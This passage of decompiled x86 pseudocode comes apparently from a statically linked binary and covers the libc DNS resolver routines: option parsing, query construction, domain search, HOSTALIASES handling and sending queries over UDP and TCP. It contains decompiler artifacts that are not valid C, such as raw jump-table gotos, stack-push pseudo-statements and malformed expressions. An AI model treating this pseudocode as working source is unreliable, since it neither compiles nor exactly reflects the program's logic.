                        if(*ebx == 0 || *ebx == 10 || *ebx == 59) {
                            goto L0804d8e0;
                        }
                        Vfffffbe0 = ebx;
                        do {
                            if(L08057970("/&", *ebx & 255) != 0 || *ebx == 59 || *ebx < 0) {
                                break;
                            }
                            edx = *ebx & 255;
                            if(*( *L08078FA0 + edx * 2 + 1) & 32) {
                                break;
                            }
                            ebx = ebx + 1;
                        } while(*ebx != 0);
                        esi = *ebx & 255;
                        *ebx = 0;
                        if(L0804CEB4(Vfffffbe0, & Vfffffbf8) != 0) {
                            *(edi + 0x80786ac) = Vfffffbf8;
                            if(L08057970("/&", esi) != 0) {
                                *ebx = esi;
                                ebx = ebx + 1;
                                Vfffffbe0 = ebx;
                                if(*ebx != 0 && *ebx != 59 && *ebx >= 0) {
                                    eax = *ebx & 255;
                                    edx = *L08078FA0;
                                    if(!( *(edx + eax * 2 + 1) & 32)) {
                                        do {
                                            ebx = ebx + 1;
                                            if(*ebx == 0 || *ebx == 59 || *ebx < 0) {
                                                goto L0804dce6;
                                            }
                                        } while(*(edx + ( *ebx & 255) * 2 + 1) & 32);
                                    }
                                }
L0804dce6:
                                esi = *ebx & 255;
                                *ebx = 0;
                                if(L0804CEB4(Vfffffbe0, & Vfffffbf8) != 0) {
                                    goto L0804dd0c;
                                }
                            }
                            *(edi + 0x80786b0) = L0804DF74( *(edi + 0x80786ac));
                            goto L0804dd29;
L0804dd0c:
                            *(edi + 0x80786b0) = Vfffffbf8;
L0804dd29:
                            edi = edi + 8;
                            Vfffffbe4 = Vfffffbe4 + 1;
                        }
                        *ebx = esi;
                    } while(Vfffffbe4 <= 9);
                    continue;
L0804db19:
                    ebx = & Vfffffc0a;
                    if(Vfffffc0a == 32 || Vfffffc0a == 9) {
                        do {
                            ebx = ebx + 1;
                            if(*ebx == 32) {
                                continue;
                            }
                        } while(*ebx == 9);
                    }
                    if(*ebx == 0 || *ebx == 10 || L0804CEB4(ebx, & Vfffffbfc) == 0) {
                        continue;
                    }
                    edx = Vfffffbf0 << 4;
                    *(edx + 0x8078558) = Vfffffbfc;
                    *(edx + 0x8078554) = 2;
                    *(edx + 0x8078556) = 13568;
                    Vfffffbf0 = Vfffffbf0 + 1;
                    continue;
                }
                if(Vfffffbec != 0) {
                    continue;
                }
                ebx = & Vfffffc06;
                if(Vfffffc06 == 32 || Vfffffc06 == 9) {
                    do {
                        ebx = ebx + 1;
                        if(*ebx == 32) {
                            continue;
                        }
                    } while(*ebx == 9);
                }
                if(*ebx == 0 || *ebx == 10) {
                    continue;
                }
                L0805680C();
                ebx = L08057970(0x80785a4, 10, 0x80785a4, ebx, 255);
                if(ebx != 0) {
                    *ebx = 0;
                }
                ebx = 0x80785a4;
                *L08078588 = 0x80785a4;
                edx = 0x807858c;
                esi = 0;
                if(*L080785A4 != 0) {
                    do {
                        if(edx >= 0x80785a0) {
                            break;
                        }
                        if(*ebx != 32) {
                            if(*ebx == 9) {
                                goto L0804da92;
                            }
                            if(esi != 0) {
                                *edx = ebx;
                                edx = edx + 4;
                                esi = 0;
                            }
                        } else {
L0804da92:
                            *ebx = 0;
                            esi = 1;
                        }
                        ebx = ebx + 1;
                    } while(*ebx != 0);
                    while(*ebx != 0 && *ebx != 32 && *ebx != 9) {
                        ebx = ebx + 1;
                    }
                }
                *ebx = 0;
                *edx = 0;
                Vfffffbe8 = 1;
                continue;
            }
            if(Vfffffbec != 0) {
                continue;
            }
            ebx = & Vfffffc06;
            if(Vfffffc06 == 32 || Vfffffc06 == 9) {
                do {
                    ebx = ebx + 1;
                    if(*ebx == 32) {
                        continue;
                    }
                } while(*ebx == 9);
            }
            if(*ebx == 0 || *ebx == 10) {
                continue;
            }
            L0805680C();
            ebx = L08057B30(0x80785a4, " \t\n", 0x80785a4, ebx, 255);
            if(ebx != 0) {
                *ebx = 0;
            }
            Vfffffbe8 = 0;
        }
        goto L0804d9c0;
L0804dd98:
        if(Vfffffbf0 > 1) {
            *L08078550 = Vfffffbf0;
        }
        *L080786A8 = *L080786A8 & 15;
        *L080786A8 = *L080786A8 | Vfffffbe4 << 4;
        L0804F540(Vfffffbf4);
    }
    if(*L080785A4 == 0) {
        ebx = & Vfffffc00;
        if(L08056954(ebx, 255) == 0) {
            ebx = L08057970(ebx, 46);
            if(ebx != 0) {
                L08056640(0x80785a4, ebx + 1);
            }
        }
    }
    if(Vfffffbe8 == 0) {
        *L08078588 = 0x80785a4;
        *L0807858C = 0;
    }
    ebx = L08055668("RES_OPTIONS");
    if(ebx != 0) {
        L0804DE68(ebx, "env");
    }
    *L0807854C = *L0807854C | 1;
    esp = ebp + -1072;
    return(0);
}



L0804DE68(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ebx = A8;
    if(!( *L0807854C & 2)) {
        eax = L0804F7EC(";; res_setoptions(\"%s\", \"%s\")...\n", ebx, Ac);
    }
L0804df60:
    while(*ebx != 0) {
        while(*ebx == 32 || *ebx == 9) {
            ebx = ebx + 1;
        }
        if(L08057B04(ebx, "ndots:", 6) != 0) {
            eax = L08057B04(ebx, "debug", 5);
            if(eax == 0) {
                if(!( *L0807854C & 2)) {
                    L0804F7EC(";; res_setoptions(\"%s\", \"%s\")..\n", A8, Ac);
                    *L0807854C = *L0807854C | 2;
                }
                eax = L0804F7EC(";;\tdebug\n");
            }
        } else {
            eax = L08056064(ebx + 6, 0, 10, 0);
            if(eax > 15) {
                *L080786A8 = *L080786A8 | 15;
            } else {
                *L080786A8 = *L080786A8 & 240;
                *L080786A8 = *L080786A8 | al & 15;
            }
            if(!( *L0807854C & 2)) {
                eax = L0804F7EC(";;\tndots=%d\n", *L080786A8 & 15);
            }
        }
        while(1) {
            if(*ebx == 0) {
                goto L0804df69;
            }
            if(*ebx == 32 || *ebx == 9) {
                goto L0804df60;
            }
            ebx = ebx + 1;
        }
    }
L0804df69:
}



L0804DF74(A8)
/* unknown */ void  A8;
{



    asm("xchg al,ah");
    asm("ror eax,0x10");
    asm("xchg al,ah");
    if(A8 >= 0) {
        return(255);
    }
    if((A8 & -1073741824) != -2147483648) {
        esp = ebp;
        return(16777215);
    }
    esp = ebp;
    return(65535);
}



L0804DFB4()
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save)0;
    (save) & Vfffffff8;
    gettimeofday();
    eax = getpid();
    edx = eax;
    return((Vfffffff8 ^ Vfffffffc ^ dx) & 65535);
}


L0804DFE0(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffc00;



    ebx = A10;
    esi = A14;
    *(esi + 3) = *(esi + 3) & 240;
    if(!( *L0807854C & 1)) {
        if(L0804D744() != -1) {
            goto L0804e020;
        }
        *L0807E788 = -1;
L0804e016:
        eax = -1;
    } else {
L0804e020:
        if(!( *L0807854C & 2)) {
            L0804F7EC(";; res_query(%s, %d, %d)\n", A8, Ac, ebx);
        }
        ebx = L080608C8(0, A8, Ac, ebx, 0, 0, 0, & Vfffffc00, 1024);
        if(ebx <= 0) {
            if(!( *L0807854C & 2)) {
                (save)";; res_query: mkquery failed\n";
                L0804F7EC();
            }
            *L0807E788 = 3;
        } else {
            eax = L0804EA0C( & Vfffffc00, ebx, A14, A18);
            ebx = eax;
            if(ebx < 0) {
                if(!( *L0807854C & 2)) {
                    (save)";; res_query: send error\n";
                    L0804F7EC();
                }
                *L0807E788 = 2;
            } else {
                if(*(esi + 3) & 15) {
                    goto L0804e0dd;
                }
                ax = *(esi + 6);
                asm("xchg al,ah");
                if(ax == 0) {
L0804e0dd:
                    if(!( *L0807854C & 2)) {
                        ax = *(esi + 6);
                        asm("xchg al,ah");
                        eax = eax & 65535;
                        eax = L0804F7EC(";; rcode = %d, ancount=%d\n", *(esi + 3) & 15, eax);
                    }
                    eax = *(esi + 3) & 15;
                    if(eax <= 5) {
                        goto *(eax * 4 + 0x804e118)[L0804e150, L0804e160, L0804e140, L0804e130, L0804e160, L0804e160, ]goto ( *(eax * 4 + 0x804e118));
                        *L0807E788 = 1;
                        goto L0804e016;
                        *L0807E788 = 2;
                        goto L0804e016;
                        *L0807E788 = 4;
                        goto L0804e016;
                    }
                    *L0807E788 = 3;
                    goto L0804e016;
                }
            }
        }
        eax = ebx;
    }
    esp = ebp + -1036;
}



L0804E180(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = A14;
    Vfffffff4 = 0;
    Vfffffff0 = 0;
    Vffffffec = 0;
    if(!( *L0807854C & 1) && L0804D744() == -1) {
        *L0807E788 = -1;
    } else {
        *L08078B14 = 0;
        *L0807E788 = 1;
        ebx = 0;
        eax = A8;
        if(*A8 != 0) {
            do {
                if(*eax == 46) {
                    ebx = ebx + 1;
                }
                eax = eax + 1;
            } while(*eax != 0);
        }
        esi = 0;
        if(eax > A8 && *(eax - 1) == 46) {
            esi = 1;
        }
        if(ebx == 0) {
            eax = L0804E490(A8);
            if(eax != 0) {
                eax = L0804DFE0(eax, Ac, A10, A14, A18);
                goto L0804e38d;
            }
        }
        Vfffffff8 = -1;
        if(ebx >= ( *L080786A8 & 15)) {
            eax = L0804E398(A8, 0, Ac, A10, A14, A18);
            if(eax > 0) {
                goto L0804e38d;
            }
            Vfffffff8 = *L0807E788;
            Vffffffec = Vffffffec + 1;
        }
        if(ebx == 0) {
            if(*L0807854C < 0) {
                goto L0804e2a1;
            }
        } else {
            if(esi == 0 && !( *L0807854D & 2)) {
L0804e2a1:
                ebx = 0;
                esi = 0x8078588;
                if(*L08078588 != 0) {
                    do {
                        eax = L0804E398(A8, *esi, Ac, A10, A14, A18);
                        if(eax > 0) {
                            goto L0804e38d;
                        }
                        if(*L08078B14 == 111) {
                            goto L0804e37e;
                        }
                        eax = *L0807E788;
                        if(eax == 2) {
                            if(( *(Vfffffffc + 3) & 15) != 2) {
                                goto L0804e318;
                            }
                            Vfffffff0 = Vfffffff0 + 1;
                        } else {
                            > ? L0804e2f8 : ;
                            if(eax != 1) {
L0804e318:
                                ebx = ebx + 1;
                            }
                        }
L0804e319:
                        if(!( *L0807854D & 2)) {
                            ebx = ebx + 1;
                        }
                        esi = esi + 4;
                        if(*esi == 0) {
                            break;
                        }
                    } while(ebx == 0);
                    goto L0804e32f;
                    if(eax != 4) {
                        goto L0804e318;
                    }
                    Vfffffff4 = Vfffffff4 + 1;
                    goto L0804e319;
                }
            }
        }
L0804e32f:
        if(Vffffffec == 0) {
            eax = L0804E398(A8, 0, Ac, A10, A14, A18);
            if(eax > 0) {
                goto L0804e38d;
            }
        }
        if(Vfffffff8 != -1) {
            *L0807E788 = Vfffffff8;
        } else {
            if(Vfffffff4 != 0) {
                *L0807E788 = 4;
            } else {
                if(Vfffffff0 != 0) {
L0804e37e:
                    *L0807E788 = 2;
                }
            }
        }
    }
    eax = -1;
L0804e38d:
    esp = ebp - 32;
}



L0804E398(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffdfc;



    edi = Ac;
    esi = & Vfffffdfc;
    if(!( *L0807854C & 1) && L0804D744() == -1) {
        *L0807E788 = -1;
        eax = -1;
    } else {
        if(!( *L0807854C & 2)) {
            (save)A14;
            (save)A10;
            eax = edi;
            if(edi == 0) {
                eax = "<Nil>";
            }
            (save)eax;
            (save)A8;
            (save)";; res_querydomain(%s, %s, %d, %d)\n";
            L0804F7EC();
            esp = esp + 20;
        }
        if(edi == 0) {
            al = 0;
            edi = A8;
            asm("cld");
            ecx = -1;
            asm("repne scasb");
            edi = !ecx - 2;
            if(edi != -1) {
                if(*(edi + A8) != 46 || edi > 512) {
                    goto L0804e448;
                }
                L08056480(A8, & Vfffffdfc, edi);
                *(edi + & Vfffffdfc) = 0;
            } else {
L0804e448:
                esi = A8;
            }
        } else {
            L0804F808( & Vfffffdfc, "%.*s.%.*s", 256, A8, 256, edi);
        }
        eax = L0804DFE0(esi, A10, A14, A18, A1c);
    }
    esp = ebp + -528;
}



L0804E490(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc01;
	/* unknown */ void  Vffffffff;



    if(!( *L0807854D & 16)) {
        eax = L08055668("HOSTALIASES");
        if(eax != 0) {
            edi = L0804F620(eax, "r");
            if(edi != 0) {
                L08054DF0(edi, 0);
                Vffffffff = 0;
                Vfffffbfc = & Vfffffc00;
                do {
                    if(L0804F5C4(Vfffffbfc, 1024, edi) == 0) {
                        goto L0804e620;
                    }
                    ebx = Vfffffbfc;
                    if(Vfffffc00 == 0) {
                        goto L0804e620;
                    }
                    edx = *L08078FA0;
                    if(!( *(edx + (Vfffffc00 & 255) * 2 + 1) & 32)) {
                        ebx = & Vfffffc01;
                        if(Vfffffc01 == 0) {
                            goto L0804e620;
                        }
                        if(!( *(edx + (Vfffffc01 & 255) * 2 + 1) & 32)) {
                            do {
                                ebx = ebx + 1;
                                if(*ebx == 0) {
                                    goto L0804e620;
                                }
                            } while(*(edx + ( *ebx & 255) * 2 + 1) & 32);
                        }
                    }
                    if(*ebx == 0) {
                        goto L0804e620;
                    }
                    *ebx = 0;
                } while(L080565F8(Vfffffbfc, A8) != 0);
                ebx = ebx + 1;
                eax = *ebx & 255;
                edx = *L08078FA0;
                if(!( *(edx + eax * 2 + 1) & 32)) {
                    do {
                        ebx = ebx + 1;
                    } while(*(edx + ( *ebx & 255) * 2 + 1) & 32);
                }
                if(*ebx != 0) {
                    edx = ebx + 1;
                    if(*(ebx + 1) != 0) {
                        eax = *(ebx + 1) & 255;
                        ecx = *L08078FA0;
                        if(!( *(ecx + eax * 2 + 1) & 32)) {
                            edx = ebx + 2;
                            if(*(ebx + 2) != 0 && !( *(ecx + ( *(ebx + 2) & 255) * 2 + 1) & 32)) {
                                do {
                                    edx = edx + 1;
                                    if(*edx == 0) {
                                        goto L0804e5f8;
                                    }
                                } while(*(ecx + ( *edx & 255) * 2 + 1) & 32);
                            }
                        }
                    }
L0804e5f8:
                    *edx = 0;
                    *L0807A857 = 0;
                    (save)255;
                    (save)ebx;
                    (save)0x807a758;
                    L0805680C();
                    (save)edi;
                    L0804F540();
                    eax = 0x807a758;
                    goto L0804e628;
                }
L0804e620:
                L0804F540(edi);
            }
        }
    }
    eax = 0;
L0804e628:
    esp = ebp + -1040;
}



L0804E638(A8, Ac, A10, A16, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A16;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;



    eax = A10;
    ebx = *L08078B14;
    if(!( *L0807854C & 2)) {
        (save)eax;
        eax = L080566A4();
        (save)eax;
        asm("xchg al,ah");
        eax = L0804F680(A8, "res_send: %s ([%s].%u): %s\n", Ac, L0805E984(A18), eax & 65535);
    }
    *L08078B14 = ebx;
}



L0804E694(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    eax = A10;
    ebx = *L08078B14;
    if(!( *L0807854C & 2)) {
        eax = L0804F680(A8, "res_send: %s: %s\n", Ac, L080566A4(), eax);
    }
    *L08078B14 = ebx;
}





L0804E6F8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edx = A8;
    ecx = *edx;
    Vfffffff0 = ecx;
    Vfffffff4 = *(edx + 4);
    Vfffffff8 = *(edx + 8);
    Vfffffffc = *(edx + 12);
    esi = 0;
    Vffffffec = 0;
    if(*L08078550 > 0) {
        Vffffffe8 = ecx;
        ecx = 0x8078558;
        Vffffffe4 = 0x8078554;
        eax = *L08078550 & 3;
        if(*L08078550 > 0) {
            if(eax == 0) {
                goto L0804e7f0;
            }
            if(eax > 1) {
                if(eax > 2) {
                    if(*L08078554 == Vffffffe8 && ( *L08078558 == 0 || Vfffffff4 == *L08078558)) {
                        goto L0804e859;
                    }
                    ecx = ecx + 16;
                    Vffffffe4 = Vffffffe4 + 16;
                    Vffffffec = Vffffffec + 1;
                }
                if(*Vffffffe4 == Vffffffe8 && ( *ecx == 0 || Vfffffff4 == *ecx)) {
                    goto L0804e859;
                }
                ecx = ecx + 16;
                Vffffffe4 = Vffffffe4 + 16;
                Vffffffec = Vffffffec + 1;
            }
        }
        if(*Vffffffe4 == Vffffffe8 && ( *ecx == 0 || Vfffffff4 == *ecx)) {
            goto L0804e859;
        }
        ecx = ecx + 16;
        Vffffffe4 = Vffffffe4 + 16;
        Vffffffec = Vffffffec + 1;
        if(*L08078550 != Vffffffec) {
L0804e7f0:
            Vffffffe0 = ecx;
            edx = ecx;
            ecx = Vffffffe4;
            do {
                if(*ecx == Vffffffe8 && ( *edx == 0 || Vfffffff4 == *Vffffffe0) || *(ecx + 16) == Vffffffe8 && ( *(edx + 16) == 0 || Vfffffff4 == *(Vffffffe0 + 16)) || *(ecx + 32) == Vffffffe8 && ( *(edx + 32) == 0 || Vfffffff4 == *(Vffffffe0 + 32)) || *(ecx + 48) == Vffffffe8 && ( *(edx + 48) == 0 || Vfffffff4 == *(Vffffffe0 + 48))) {
                    goto L0804e859;
                }
                Vffffffe0 = Vffffffe0 + 64;
                edx = edx + 64;
                ecx = ecx + 64;
                Vffffffec = Vffffffec + 4;
            } while(*L08078550 != Vffffffec);
            goto L0804e875;
L0804e859:
            esi = esi + 1;
        }
    }
L0804e875:
    eax = esi;
    esp = ebp - 44;
}



L0804E884(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffefc;



    esi = A14 + 12;
    ax = *(A14 + 4);
    asm("xchg al,ah");
    edi = ax & 65535;
    eax = edi;
    edi = edi - 1;
    if(eax > 0) {
        Vfffffef8 = & Vfffffefc;
        do {
            eax = L0804D02C(A14, A18, esi, Vfffffef8, 257);
            if(eax < 0) {
                goto L0804e8dd;
            }
            esi = esi + eax;
            L0804D6B8(esi);
            ebx = ax & 65535;
            esi = esi + 2;
            eax = L0804D6B8(esi) & 65535;
            esi = esi + 2;
            if(Ac == ebx && A10 == eax && L080565F8(Vfffffef8, A8) == 0) {
                goto L0804e924;
            }
            eax = edi;
            edi = edi - 1;
        } while(eax > 0);
        goto L0804e933;
L0804e8dd:
        eax = -1;
        goto L0804e935;
L0804e924:
        eax = 1;
    } else {
L0804e933:
        eax = 0;
    }
L0804e935:
    esp = ebp + -276;
}



L0804E944(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffefc;



    esi = A8 + 12;
    ax = *(A8 + 4);
    asm("xchg al,ah");
    edi = ax & 65535;
    ax = *(A10 + 4);
    asm("xchg al,ah");
    if(edi != (eax & 65535)) {
L0804e974:
        eax = 0;
        goto L0804e9fe;
L0804e97c:
        eax = -1;
    } else {
        eax = edi;
        edi = edi - 1;
        if(eax > 0) {
            Vfffffef8 = & Vfffffefc;
            do {
                eax = L0804D02C(A8, Ac, esi, Vfffffef8, 257);
                if(eax < 0) {
                    goto L0804e97c;
                }
                esi = esi + eax;
                L0804D6B8(esi);
                ebx = ax & 65535;
                esi = esi + 2;
                eax = L0804D6B8(esi) & 65535;
                esi = esi + 2;
                if(L0804E884(Vfffffef8, ebx, eax, A10, A14) == 0) {
                    goto L0804e974;
                }
                eax = edi;
                edi = edi - 1;
            } while(eax > 0);
        }
        eax = 1;
    }
L0804e9fe:
    esp = ebp + -276;
}



L0804EA0C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffdac;
	/* unknown */ void  Vfffffdb0;
	/* unknown */ void  Vfffffdb4;
	/* unknown */ void  Vfffffdb8;
	/* unknown */ void  Vfffffdbc;
	/* unknown */ void  Vfffffdc0;
	/* unknown */ void  Vfffffdc4;
	/* unknown */ void  Vfffffdc8;
	/* unknown */ void  Vfffffdcc;
	/* unknown */ void  Vfffffdd0;
	/* unknown */ void  Vfffffdd4;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde0;
	/* unknown */ void  Vfffffde4;
	/* unknown */ void  Vfffffe04;
	/* unknown */ void  Vfffffe14;
	/* unknown */ void  Vfffffe16;
	/* unknown */ void  Vfffffe18;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffdd4 = A8;
    Vfffffdd0 = A10;
    if(!( *L0807854C & 1) && L0804D744() == -1) {
        goto L0804f4e4;
    }
    if(*L0807854C & 2 || !( *L080786A5 & 16)) {
        L0804F680();
        L0805F1DC(A8, Ac, 0x8078750, 0x8078750, ";; res_send()\n");
    }
    Vfffffdbc = 0;
    if(*L0807854C & 8 || Ac > 512) {
        Vfffffdbc = 1;
    }
    Vfffffdcc = 0;
    Vfffffdc8 = 0;
    Vfffffdc4 = 110;
    Vfffffdb8 = 0;
    Vfffffdc0 = 0;
    if(*L08078548 > Vfffffdcc) {
        do {
            esi = 0;
            if(*L08078550 > 0) {
                do {
                    while(1) {
                        eax = Vfffffdb8;
                        asm("bt eax,esi");
                        if(!(Vfffffffc = (esi << 4) + 0x8078554)) {
                            break;
                        }
                        if(*L0807853C != 0) {
                            ebx = 0;
                            do {
                                edx = *( *L0807853C)( & Vfffffffc, & A8, & Ac, A10, A14, & Vfffffff8);
                                if(edx > 4) {
                                    goto L0804f4e4;
                                }
                                goto *(edx * 4 + 0x804eb5c)[L0804eb80, L0804eb0c, L0804eb70, L0804f448, L0804f4e4, ]goto ( *(edx * 4 + 0x804eb5c));
                                if(ebx + 1 > 41) {
                                    goto L0804f4e4;
                                }
                            } while(0 == 0);
                        }
                        if(!( *L0807854C & 2)) {
                            L0804F680(0x8078750, ";; Querying server (# %d) address = %s\n", esi + 1, L0805E984(), *(Vfffffffc + 4));
                        }
                        if(Vfffffdbc == 0) {
                            if(*L08078530 < 0 || *L08078538 != 0) {
                                if(*L08078538 != 0) {
                                    L0804F4F8();
                                }
                                eax = socket(AF_INET, SOCK_DGRAM, IP);
                                *L08078530 = eax;
                                if(*L08078530 < 0) {
                                    goto L0804f4c4;
                                }
                                *L08078534 = 0;
                            }
                            if(*L08078550 != 1) {
                                if(Vfffffdc0 != 0) {
                                    goto L0804efbc;
                                }
                                if(esi != 0) {
L0804efbc:
                                    if(*L08078534 != 0) {
                                        Vfffffe14 = 2;
                                        Vfffffe18 = 0;
                                        Vfffffe16 = 0;
                                        connect( *L08078530, & Vfffffe14, 16);
                                        *L08078534 = 0;
                                        *L08078B14 = 0;
                                    }
                                    if(Ac == sendto( *L08078530, A8, Ac, 0, Vfffffffc, 16)) {
                                        goto L0804f074;
                                    } else {
                                        goto L0804f02f;
                                    }
                                }
                            }
                            if(*L08078534 == 0) {
                                if(connect( *L08078530, Vfffffffc, 16) < 0) {
                                    goto L0804ef44;
                                }
                                *L08078534 = 1;
                            }
                            if(Ac != send( *L08078530, A8, Ac, 0)) {
                                goto L0804efa3;
                            }
L0804f074:
                            edx = *L08078544 << Vfffffdc0;
                            Vfffffddc = edx;
                            if(Vfffffdc0 > 0) {
                                eax = edx;
                                asm("cdq");
                                *L08078550 = *L08078550 / *L08078550;
                                edx = *L08078550 % *L08078550;
                                Vfffffddc = eax;
                            }
                            if(Vfffffddc <= 0) {
                                Vfffffddc = 1;
                            }
                            Vfffffde0 = 0;
                            do {
                                edx = & Vfffffde4;
                                eax = 0;
                                ecx = 8;
                                edi = edx;
                                asm("cld");
                                asm("rep stosd");
                                eax = *L08078530;
                                asm("bts [ebp+0xfffffde4],eax");
                                ebx = select( *L08078530 + 1, edx, 0, 0, & Vfffffddc);
                                if(ebx >= 0) {
                                    if(ebx == 0) {
                                        goto L0804f118;
                                    }
                                    *L08078B14 = 0;
                                    Vfffffdd8 = 16;
                                    edx = recvfrom( *L08078530, A10, A14, 0, & Vfffffe04, & Vfffffdd8);
                                    Vfffffff8 = edx;
                                    if(Vfffffff8 <= 0) {
                                        goto L0804f18d;
                                    }
                                    Vfffffdcc = 1;
                                    if(*Vfffffdd0 == *Vfffffdd4) {
                                        if(*L0807854D & 4 || L0804E6F8( & Vfffffe04) != 0) {
                                            if(*L0807854D & 8 || L0804E944(A8, A8 + Ac, A10, A10 + A14) != 0) {
                                                goto L0804f2ac;
                                            }
                                            if(!( *L0807854C & 2) && *L080786A5 & 32) {
                                                continue;
                                            }
                                            (save)";; wrong query name:\n";
                                        } else {
                                            if(!( *L0807854C & 2) && *L080786A5 & 32) {
                                                continue;
                                            }
                                            (save)";; not our server:\n";
                                        }
                                        (save)0x8078750;
                                        L0804F680();
                                        (save)0x8078750;
                                        (save)Vfffffff8;
                                        (save)A10;
                                    } else {
                                        if(!( *L0807854C & 2) && *L080786A5 & 32) {
                                            continue;
                                        }
                                        (save)";; old answer:\n";
                                        (save)0x8078750;
                                        L0804F680();
                                        (save)0x8078750;
                                        (save)Vfffffff8;
                                        (save)A10;
                                    }
                                    L0805F1DC();
                                    esp = esp + 20;
                                    continue;
                                }
                            } while(*L08078B14 == 4);
                            goto L0804f106;
L0804f2ac:
                            dl = *(Vfffffdd0 + 3) & 15;
                            if(dl == 2 || dl + 252 <= 1) {
                                if(!( *L0807854C & 2)) {
                                    L0804F680();
                                    L0805F1DC(A10, Vfffffff8, 0x8078750, 0x8078750, "server rejected query:\n");
                                }
                                Vfffffdb8 = Vfffffdb8 | 1 << esi;
                                L0804F4F8();
                                if(*L080786A4 == 0) {
                                    goto L0804f450;
                                }
                            }
                            if(*L0807854C & 32 || *(Vfffffdd0 + 2) & 2) {
                                goto L0804f358;
                            }
                            if(!( *L0807854C & 2)) {
                                L0804F680(0x8078750, ";; truncated answer\n");
                            }
                            Vfffffdbc = 1;
                            L0804F4F8();
                            continue;
                        }
                        Vfffffdc0 = *L08078548;
                        Vfffffdb4 = 0;
                        if(*L08078530 >= 0) {
                            if(*L08078538 != 0) {
                                goto L0804ec86;
                            }
                            if(*L08078530 >= 0) {
                                L0804F4F8();
                            }
                        }
                        edx = socket(AF_INET, SOCK_STREAM, IP);
                        *L08078530 = edx;
                        if(edx < 0) {
                            goto L0804f4a4;
                        }
                        *L08078B14 = 0;
                        if(connect(edx, Vfffffffc, 16) < 0) {
                            goto L0804ec33;
                        }
                        *L08078538 = 1;
L0804ec86:
                        ebx = & Vffffffe6;
                        L0804D700(Ac & 65535, ebx);
                        Vffffffe8 = ebx;
                        Vffffffec = 2;
                        Vfffffff0 = A8;
                        Vfffffff4 = Ac;
                        (save)2;
                        (save) & Vffffffe8;
                        (save) *L08078530;
                        esp = esp + 20;
                        if(L08056E70() != Ac + 2) {
                            goto L0804ecca;
                        }
                        Vfffffdac = A10;
                        Vffffffe6 = 2;
                        do {
                            edi = Vfffffdac;
                            ebx = read( *L08078530, edi, Vffffffe6 & 65535);
                            if(ebx <= 0) {
                                goto L0804ed45;
                            }
                            Vfffffdac = edi + ebx;
                        } while(Vffffffe6 = Vffffffe6 - bx);
                        if(ebx > 0) {
                            goto L0804ed98;
                        }
L0804ed45:
                        ecx = *L08078B14;
                        Vfffffdc4 = ecx;
                        L0804E694(0x80787a4, "read failed", Vfffffdc4);
                        L0804F4F8();
                        esp = esp + 12;
                        if(Vfffffdc4 != 104 || Vfffffdc8 != 0) {
                            break;
                        }
                        Vfffffdc8 = 1;
                        L0804F4F8();
                    }
                    goto L0804eb0c;
L0804f02f:
                    edx = Vfffffffc;
                    (save) *(edx + 12);
                    (save) *(edx + 8);
                    (save) *(edx + 4);
                    (save) *edx;
                    (save) *L08078B14;
                    (save)"sendto";
                    goto L0804f04c;
L0804f18d:
                    (save) *L08078B14;
                    (save)"recvfrom";
                    goto L0804f193;
L0804f118:
                    if(!( *L0807854C & 2)) {
                        L0804F680(0x8078750, ";; timeout\n");
                    }
                    Vfffffdcc = 1;
                    goto L0804eb0c;
L0804f106:
                    (save) *L08078B14;
                    (save)"select";
                    goto L0804f193;
L0804efa3:
